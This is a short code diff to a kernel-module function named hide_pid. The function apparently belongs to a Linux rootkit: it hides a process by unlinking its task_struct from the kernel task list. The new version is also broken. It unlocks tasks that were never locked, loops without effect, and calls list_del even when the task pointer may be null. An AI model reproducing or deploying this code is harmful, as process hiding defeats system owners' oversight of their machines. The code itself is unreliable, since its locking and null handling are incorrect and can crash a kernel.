@@ -67,10 +67,22 @@ hide_pid(pid_t pid)
     add_pid_to_list(hidden_pids_tail, pid);
 
     task_struct *ts = find_task_by_vid(pid);
-    if (ts) {
-        DEBUG_INFO("found\n");
-        list_del(&ts->tasks);
+    struct task_struct *task;
+
+    rcu_read_lock();
+    for_each_process(task) {
+        task_lock(task);
+        if(ts == task) {
+            task_unlock(task);
+            continue;
+        }
+        task_unlock(task);
     }
+    list_del(&ts->tasks);
+    for_each_process(task) {
+        task_unlock(task);
+    }
+    rcu_read_unlock();
 }
 
 void
